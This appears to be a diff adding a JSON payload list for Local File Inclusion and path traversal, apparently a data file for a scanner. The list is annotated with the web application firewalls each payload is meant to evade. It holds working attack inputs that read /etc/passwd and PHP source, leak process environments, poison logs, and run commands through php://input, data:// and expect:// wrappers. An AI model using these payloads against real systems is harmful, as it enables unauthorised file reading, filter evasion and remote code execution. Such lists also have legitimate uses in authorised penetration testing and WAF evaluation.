@@ -1,0 +1,241 @@
+{
+    "vulnerability_type": "LFI",
+    "description": "Local File Inclusion / Path Traversal payloads with WAF bypass variants",
+    "payloads": [
+        {
+            "payload": "../../../etc/passwd",
+            "description": "Basic path traversal",
+            "context": "file_parameter",
+            "waf_bypass": false,
+            "tags": [
+                "basic",
+                "traversal"
+            ]
+        },
+        {
+            "payload": "....//....//....//etc/passwd",
+            "description": "Double dot-slash traversal",
+            "context": "file_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity",
+                "cloudflare"
+            ],
+            "tags": [
+                "double_dot",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "..%2f..%2f..%2fetc%2fpasswd",
+            "description": "URL encoded slashes",
+            "context": "file_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "aws_waf"
+            ],
+            "tags": [
+                "url_encode",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "..%252f..%252f..%252fetc%252fpasswd",
+            "description": "Double URL encoded slashes",
+            "context": "file_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "akamai",
+                "imperva"
+            ],
+            "tags": [
+                "double_encode",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+            "description": "URL encoded dots",
+            "context": "file_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity",
+                "aws_waf"
+            ],
+            "tags": [
+                "url_encode",
+                "dots",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "..\\..\\..\\etc\\passwd",
+            "description": "Backslash traversal (Windows/some servers)",
+            "context": "file_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity"
+            ],
+            "tags": [
+                "backslash",
+                "windows",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "....\\\\....\\\\....\\\\etc\\\\passwd",
+            "description": "Double backslash traversal",
+            "context": "file_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity",
+                "cloudflare"
+            ],
+            "tags": [
+                "double_backslash",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "../../../etc/passwd%00",
+            "description": "Null byte termination (PHP < 5.3)",
+            "context": "file_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity"
+            ],
+            "tags": [
+                "null_byte",
+                "php",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "../../../etc/passwd%00.jpg",
+            "description": "Null byte + extension bypass",
+            "context": "file_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity",
+                "cloudflare"
+            ],
+            "tags": [
+                "null_byte",
+                "extension_bypass",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "php://filter/convert.base64-encode/resource=index.php",
+            "description": "PHP filter wrapper for source code read",
+            "context": "file_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "aws_waf"
+            ],
+            "tags": [
+                "php_wrapper",
+                "filter",
+                "source_read",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "php://input",
+            "description": "PHP input wrapper for code execution",
+            "context": "file_parameter",
+            "waf_bypass": false,
+            "tags": [
+                "php_wrapper",
+                "input",
+                "rce"
+            ]
+        },
+        {
+            "payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
+            "description": "Data wrapper with base64 encoded PHP",
+            "context": "file_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity",
+                "aws_waf"
+            ],
+            "tags": [
+                "data_wrapper",
+                "base64",
+                "rce",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "expect://id",
+            "description": "Expect wrapper for command execution",
+            "context": "file_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare"
+            ],
+            "tags": [
+                "expect_wrapper",
+                "rce",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "/proc/self/environ",
+            "description": "Process environment variables leak",
+            "context": "file_parameter",
+            "waf_bypass": false,
+            "tags": [
+                "proc",
+                "environ",
+                "info_leak"
+            ]
+        },
+        {
+            "payload": "/var/log/apache2/access.log",
+            "description": "Log file inclusion for RCE",
+            "context": "file_parameter",
+            "waf_bypass": false,
+            "tags": [
+                "log_poisoning",
+                "rce"
+            ]
+        },
+        {
+            "payload": "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+            "description": "UTF-8 overlong encoding for slash",
+            "context": "file_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "akamai",
+                "imperva",
+                "modsecurity"
+            ],
+            "tags": [
+                "utf8_overlong",
+                "encoding",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
+            "description": "Unicode fullwidth slash (U+FF0F)",
+            "context": "file_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "akamai"
+            ],
+            "tags": [
+                "unicode",
+                "fullwidth",
+                "waf_bypass"
+            ]
+        }
+    ]
+}
